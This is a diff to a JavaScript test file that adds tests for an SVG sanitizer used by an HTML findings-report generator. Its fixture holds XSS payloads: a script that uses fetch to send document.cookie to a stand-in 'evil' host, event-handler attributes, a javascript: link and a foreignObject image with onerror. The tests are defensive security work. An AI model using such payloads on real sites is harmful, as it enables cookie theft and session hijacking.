@@ -9,7 +9,7 @@
 
 const test = require("node:test");
 const assert = require("node:assert/strict");
-const { generateFindingsReport } = require("./report-html.js");
+const { generateFindingsReport, sanitizeSvg } = require("./report-html.js");
 
 function sampleSession() {
   return {
@@ -131,6 +131,35 @@ test("HTML in session data is escaped", () => {
   const html = generateFindingsReport(sess, ALL_ON);
   assert.ok(!html.includes("<script>alert(1)</script>"));
   assert.ok(html.includes("&lt;script&gt;"));
+});
+
+test("a malicious process-map SVG cannot inject script/handlers into the report", () => {
+  // The map SVG is a trust boundary for the exported, browser-opened report.
+  // Simulate a node-label XSS that slipped past the renderer's escaping.
+  const evilSvg =
+    '<svg xmlns="http://www.w3.org/2000/svg">' +
+    '<script>fetch("//evil/"+document.cookie)</script>' +
+    '<rect onload="alert(1)" onclick=alert(2) />' +
+    '<a xlink:href="javascript:alert(3)"><text>node</text></a>' +
+    '<foreignObject><body xmlns="http://www.w3.org/1999/xhtml">' +
+    '<img src=x onerror=alert(4)></body></foreignObject>' +
+    '<use xlink:href="#legit" /></svg>';
+  const html = generateFindingsReport(sampleSession(),
+    { ...ALL_ON, processMapSvg: evilSvg });
+  assert.ok(!/<script\b/i.test(html), "no <script> survives");
+  assert.ok(!/\son\w+\s*=/i.test(html), "no on* handler survives");
+  assert.ok(!/<foreignObject/i.test(html), "no <foreignObject> survives");
+  assert.ok(!/javascript:/i.test(html), "no javascript: href survives");
+  // ...but a legitimate local fragment reference is preserved.
+  assert.ok(html.includes('xlink:href="#legit"'), "local #fragment kept");
+});
+
+test("sanitizeSvg leaves an ordinary map SVG intact", () => {
+  const ok = '<svg xmlns="http://www.w3.org/2000/svg"><g class="node">' +
+    '<rect x="1" y="2" width="3" height="4"></rect><text>Search</text>' +
+    '<use xlink:href="#arrow"></use></g></svg>';
+  assert.equal(sanitizeSvg(ok), ok);
+  assert.equal(sanitizeSvg(null), "");
 });
 
 test("an unanalyzed session still produces a report", () => {
